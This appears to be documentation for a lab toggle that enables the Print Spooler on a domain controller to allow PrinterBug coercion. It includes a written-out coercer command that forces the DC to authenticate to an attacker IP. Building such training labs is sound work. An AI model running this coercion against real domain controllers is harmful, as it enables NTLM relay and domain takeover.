# printerbug

Print Spooler running on the DC (PrinterBug coercion). Sets `dc.spooler` to `enabled` on a domain controller (default: the root DC).

Attack:

Coerce the DC to authenticate to the attacker:

    coercer coerce -l <attacker ip> -t <dc ip> -u <user> -p 'Aa1234567890!' --filter-method-name RpcRemoteFindFirstPrinterChangeNotificationEx

How to verify:

    Get-Service Spooler   # Running when enabled

Disable restores the value declared for the host in the lab's `base_settings`.
